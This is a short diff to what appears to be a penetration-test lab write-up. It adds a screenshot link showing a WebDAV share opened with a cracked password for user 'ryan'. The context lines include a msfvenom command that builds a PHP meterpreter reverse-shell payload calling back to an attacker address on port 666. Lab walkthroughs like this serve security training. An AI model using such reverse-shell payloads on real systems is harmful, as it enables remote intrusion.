@@ -167,6 +167,9 @@ c) **Exploitation**
 
 - Now access Webdav with the username ryan and the cracked password : by typing `dav://192.168.1.105/webdav/` in browser
 
+![](images-red/webdav-opened.png)
+
+
 - Msfvenom to create a reverse shell script in Kali Linux (hacker's VM)
 
 - `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1.90 LPORT=666 -f raw > shell.php`
